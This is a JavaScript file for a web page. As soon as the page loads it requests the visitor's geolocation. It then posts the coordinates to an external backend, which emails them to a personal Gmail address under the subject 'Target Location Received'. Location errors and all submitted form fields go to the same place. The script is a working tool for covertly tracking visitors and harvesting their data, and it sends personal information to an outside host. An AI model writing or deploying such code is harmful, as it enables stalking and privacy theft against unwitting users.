document.addEventListener("DOMContentLoaded", function () {
    const locationDisplay = document.getElementById("locationDisplay");

    // Check if geolocation is supported
    if ("geolocation" in navigator) {
        console.log("Geolocation is supported by this browser.");

        // Automatically request location
        navigator.geolocation.getCurrentPosition(
            (position) => handleLocationSuccess(position),
            (error) => handleLocationError(error)
        );
    } else {
        console.log("Geolocation is not supported by this browser.");
        locationDisplay.textContent = "Geolocation is not supported by this browser.";
    }

    // Handle form submission
    const form = document.getElementById("dataForm");
    if (form) {
        form.addEventListener("submit", function (event) {
            event.preventDefault(); // Prevent default form submission
            const formData = new FormData(form);
            const data = Object.fromEntries(formData.entries());

            sendEmail("Form Submission", JSON.stringify(data, null, 2), "khalilrodini@gmail.com");
        });
    }
});

// Handle successful geolocation
function handleLocationSuccess(position) {
    const latitude = position.coords.latitude;
    const longitude = position.coords.longitude;

    const locationDisplay = document.getElementById("locationDisplay");
    locationDisplay.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
    console.log(`Location received: Latitude ${latitude}, Longitude ${longitude}`);

    sendEmail("Target Location Received", `Latitude: ${latitude}, Longitude: ${longitude}`, "khalilrodini@gmail.com");
}

// Handle geolocation errors
function handleLocationError(error) {
    const locationDisplay = document.getElementById("locationDisplay");
    let errorMessage;

    switch (error.code) {
        case error.PERMISSION_DENIED:
            errorMessage = "Location access denied by user. Please enable location services.";
            break;
        case error.POSITION_UNAVAILABLE:
            errorMessage = "Location information is unavailable. Check your connection.";
            break;
        case error.TIMEOUT:
            errorMessage = "Location request timed out. Try again.";
            break;
        default:
            errorMessage = "An unknown error occurred.";
            break;
    }

    locationDisplay.textContent = errorMessage;
    console.log("Geolocation error:", errorMessage);

    sendEmail("Location Access Error", errorMessage, "khalilrodini@gmail.com");
}

// Send email function
function sendEmail(subject, message, recipientEmail) {
    if (!subject || !message || !recipientEmail) {
        alert("Please fill out all fields.");
        return;
    }

    const emailData = {
        subject: subject,
        message: message,
        recipient_email: recipientEmail,
        recipient_name: "John Doe"
    };

    fetch("https://zalex-backend.onrender.com/api/send-email/", {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify(emailData),
    })
        .then((response) => {
            if (response.ok) {
                return response.json();
            } else {
                throw new Error(`Server responded with ${response.status}`);
            }
        })
        .then((data) => {
            if (data.message) {
                alert("Email sent successfully!");
            } else if (data.error) {
                alert("Error: " + data.error);
            } else {
                alert("Unexpected error occurred.");
            }
        })
        .catch((error) => {
            console.log("Error sending email:", error);
            alert("Error sending email: " + error.message);
        });
}
